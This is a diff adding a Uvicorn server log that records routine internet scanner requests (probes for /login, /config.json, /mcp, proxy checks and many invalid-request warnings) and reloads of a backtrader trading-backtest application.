+INFO:     167.94.138.50:39520 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     167.94.138.50:39534 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     167.94.138.50:56416 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     167.94.138.50:56452 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     167.94.138.50:57956 - "GET /security.txt HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     40.77.167.79:37555 - "GET / HTTP/1.1" 200 OK
+INFO:     205.210.31.107:62904 - "GET / HTTP/1.1" 200 OK
+INFO:     183.23.54.45:50189 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     124.198.131.145:54002 - "GET / HTTP/1.1" 200 OK
+INFO:     183.23.54.45:55936 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     192.159.99.180:33920 - "GET / HTTP/1.1" 200 OK
+INFO:     147.185.132.109:62914 - "GET /.well-known/security.txt HTTP/1.1" 404 Not Found
+INFO:     199.45.154.119:38290 - "GET / HTTP/1.1" 200 OK
+INFO:     199.45.154.119:53064 - "GET / HTTP/1.1" 200 OK
+INFO:     199.45.154.119:53078 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     199.45.154.119:53092 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     199.45.154.119:53102 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     199.45.154.119:53110 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     199.45.154.119:53122 - "GET /wiki HTTP/1.1" 404 Not Found
+INFO:     205.210.31.90:61924 - "GET / HTTP/1.1" 200 OK
+INFO:     65.49.1.192:58332 - "GET / HTTP/1.1" 200 OK
+INFO:     65.49.1.196:53989 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     65.49.1.197:25317 - "GET http%3A//api.ipify.org/?format=json HTTP/1.1" 404 Not Found
+INFO:     65.49.1.195:54011 - "CONNECT www.shadowserver.org%3A443 HTTP/1.1" 404 Not Found
+INFO:     115.231.78.8:30000 - "GET / HTTP/1.1" 200 OK
+INFO:     115.231.78.8:42208 - "GET / HTTP/1.1" 200 OK
+INFO:     115.231.78.8:44782 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     115.231.78.8:30585 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     192.159.99.162:44776 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     185.242.226.87:53260 - "GET / HTTP/1.1" 200 OK
+INFO:     138.197.15.3:41196 - "GET /aaa9 HTTP/1.1" 404 Not Found
+INFO:     138.197.15.3:41212 - "GET /aab8 HTTP/1.1" 404 Not Found
+INFO:     138.197.15.3:41214 - "GET / HTTP/1.1" 200 OK
+INFO:     172.105.128.11:59902 - "GET / HTTP/1.1" 200 OK
+INFO:     87.236.176.60:59717 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     142.93.218.89:36854 - "GET / HTTP/1.1" 200 OK
+INFO:     142.93.218.89:36548 - "GET /login HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     152.32.235.78:44846 - "GET / HTTP/1.1" 200 OK
+INFO:     152.32.235.78:56292 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     152.32.235.78:56296 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     152.32.235.78:56312 - "GET /sitemap.xml HTTP/1.1" 404 Not Found
+INFO:     152.32.235.78:56324 - "GET /config.json HTTP/1.1" 404 Not Found
+INFO:     152.32.235.78:56334 - "GET /sse HTTP/1.1" 404 Not Found
+INFO:     152.32.235.78:56350 - "GET /mcp HTTP/1.1" 404 Not Found
+INFO:     152.32.235.78:56362 - "GET /mcp-sse HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     172.203.245.49:58342 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     134.209.175.115:38320 - "GET / HTTP/1.1" 200 OK
+INFO:     134.209.175.115:38322 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     3.149.59.26:48726 - "GET / HTTP/1.1" 200 OK
+INFO:     3.149.59.26:48886 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     198.235.24.74:65172 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     198.235.24.121:64198 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     162.142.125.222:58702 - "GET / HTTP/1.1" 200 OK
+INFO:     162.142.125.222:58716 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     162.142.125.222:58718 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     162.142.125.222:55494 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     162.142.125.222:55506 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     162.142.125.222:55520 - "GET /login HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     65.49.1.192:49264 - "GET / HTTP/1.1" 200 OK
+INFO:     65.49.1.197:40791 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     65.49.1.194:64141 - "GET http%3A//api.ipify.org/?format=json HTTP/1.1" 404 Not Found
+INFO:     65.49.1.197:22011 - "CONNECT www.shadowserver.org%3A443 HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     45.142.154.111:36750 - "GET /api/v2/heartbeat HTTP/1.1" 404 Not Found
+INFO:     45.142.154.111:36978 - "GET / HTTP/1.1" 200 OK
+INFO:     45.142.154.111:37482 - "GET / HTTP/1.1" 200 OK
+INFO:     45.142.154.111:37694 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     198.235.24.255:61094 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     159.65.163.142:56498 - "GET / HTTP/1.1" 200 OK
+INFO:     159.65.163.142:56502 - "GET /login HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     77.81.142.249:59964 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     77.81.142.249:42716 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     207.90.244.28:54062 - "GET / HTTP/1.1" 200 OK
+INFO:     207.90.244.28:54074 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     152.32.207.88:52634 - "GET / HTTP/1.1" 200 OK
+INFO:     152.32.207.88:48650 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     152.32.207.88:48656 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     152.32.207.88:48664 - "GET /sitemap.xml HTTP/1.1" 404 Not Found
+INFO:     152.32.207.88:48666 - "GET /config.json HTTP/1.1" 404 Not Found
+INFO:     152.32.207.88:48680 - "GET /sse HTTP/1.1" 404 Not Found
+INFO:     152.32.207.88:48690 - "GET /mcp HTTP/1.1" 404 Not Found
+INFO:     152.32.207.88:48700 - "GET /mcp-sse HTTP/1.1" 404 Not Found
+INFO:     198.235.24.95:64570 - "GET / HTTP/1.1" 200 OK
+INFO:     3.131.215.38:39660 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     3.131.215.38:45214 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     198.235.24.172:60294 - "GET / HTTP/1.1" 200 OK
+WARNING:  StatReload detected changes in 'core/backtrader_runer.py'. Reloading...
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [4173134]
+/home/clive/miniconda3/lib/python3.13/site-packages/pyfolio/pos.py:25: UserWarning: Module "zipline.assets" not found; multipliers will not be applied to position notionals.
+  warnings.warn(
+INFO:     Started server process [1063574]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+WARNING:  StatReload detected changes in 'core/backtrader_runer.py'. Reloading...
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [1063574]
+/home/clive/miniconda3/lib/python3.13/site-packages/pyfolio/pos.py:25: UserWarning: Module "zipline.assets" not found; multipliers will not be applied to position notionals.
+  warnings.warn(
+INFO:     Started server process [1063650]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+可用字体: ['Andale Mono', 'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New', 'DejaVu Sans', 'DejaVu Sans Display', 'DejaVu Sans Mono', 'DejaVu Serif', 'DejaVu Serif Display', 'FontAwesome', 'Georgia', 'Impact', 'Lato', 'Liberation Mono', 'Liberation Sans', 'Liberation Sans Narrow', 'Liberation Serif', 'STIXGeneral', 'STIXNonUnicode', 'STIXSizeFiveSym', 'STIXSizeFourSym', 'STIXSizeOneSym', 'STIXSizeThreeSym', 'STIXSizeTwoSym', 'Times New Roman', 'Trebuchet MS', 'Verdana', 'Webdings', 'cmb10', 'cmex10', 'cmmi10', 'cmr10', 'cmss10', 'cmsy10', 'cmtt10', 'dsrom10', 'esint10', 'eufm10', 'msam10', 'msbm10', 'rsfs10', 'stmary10', 'wasy10']
+可用字体: ['Andale Mono', 'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New', 'DejaVu Sans', 'DejaVu Sans Display', 'DejaVu Sans Mono', 'DejaVu Serif', 'DejaVu Serif Display', 'FontAwesome', 'Georgia', 'Impact', 'Lato', 'Liberation Mono', 'Liberation Sans', 'Liberation Sans Narrow', 'Liberation Serif', 'STIXGeneral', 'STIXNonUnicode', 'STIXSizeFiveSym', 'STIXSizeFourSym', 'STIXSizeOneSym', 'STIXSizeThreeSym', 'STIXSizeTwoSym', 'Times New Roman', 'Trebuchet MS', 'Verdana', 'Webdings', 'cmb10', 'cmex10', 'cmmi10', 'cmr10', 'cmss10', 'cmsy10', 'cmtt10', 'dsrom10', 'esint10', 'eufm10', 'msam10', 'msbm10', 'rsfs10', 'stmary10', 'wasy10']
+INFO:     159.203.34.253:50688 - "GET / HTTP/1.1" 200 OK
+INFO:     159.203.34.253:50700 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+WARNING:  StatReload detected changes in 'core/backtrader_runer.py'. Reloading...
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [1063650]
+/home/clive/miniconda3/lib/python3.13/site-packages/pyfolio/pos.py:25: UserWarning: Module "zipline.assets" not found; multipliers will not be applied to position notionals.
+  warnings.warn(
+INFO:     Started server process [1070604]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
